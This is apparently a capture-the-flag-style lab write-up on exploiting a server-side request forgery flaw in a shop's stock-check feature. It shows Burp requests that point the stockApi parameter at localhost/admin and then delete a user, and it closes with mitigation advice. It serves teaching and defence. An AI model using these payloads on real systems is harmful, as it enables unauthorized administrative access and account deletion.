# Lab: Basic SSRF against the local server

## Vulnerability Details
- **Vulnerability Type:** Server-Side Request Forgery (SSRF)
- **CWE:** CWE-918: Server-Side Request Forgery (SSRF)
- **Severity:** High

## Summary
A Server-Side Request Forgery (SSRF) vulnerability in the stock check feature allows an attacker to manipulate the `stockApi` parameter to make backend HTTP requests to the locala internal server (`loclhost`). This enables unauthorized access to restricted internal interfaces, such as the administrative panel.

## Steps to Reproduce
1. Navigate to any product page on the target website.
2. Click on **Check stock** to trigger the stock checking functionality.
3. Capture the request using **Burp Suite** and send it to **Repeater**.
4. Observe the vulnerable parameter in the POST request body:
   ```http
   POST /product/stock HTTP/1.1
   Host: target-app.web-security-academy.net
   ...

   stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D2
   ```
5. Modify the `stockApi` parameter value to target the internal admin interface:
   ```http
   stockApi=http://localhost/admin
   ```
6. Send the request. The application renders the response from the internal `/admin` page.
7. To execute administrative actions (e.g., deleting a target user), update the `stockApi` parameter to:
   ```http
   stockApi=http://localhost/admin/delete?username=carlos
   ```
8. Send the modified request to successfully delete the user `carlos`.

## Impact
An unauthenticated external attacker can bypass network and application-level access controls to access sensitive internal endpoints on `localhost`. This leads to unauthorized administrative access, allowing user management actions (e.g., deleting accounts) and potential further internal exposure.

## Mitigation & Remediation
To mitigate and prevent this SSRF vulnerability:
- **Implement Strict Whitelisting:** Enforce a strict server-side whitelist of allowed domain names or IP addresses for outgoing HTTP requests.
- **Avoid Accepting Raw URLs:** Replace full URL parameters like `stockApi` with predefined identifier keys or indices (e.g., `storeId=1`) and map them to trusted target URLs on the backend.
- **Network Level Restrictions:** Configure firewall rules and network controls to block application servers from initiating requests to `localhost`, `127.0.0.1`, or internal administrative services.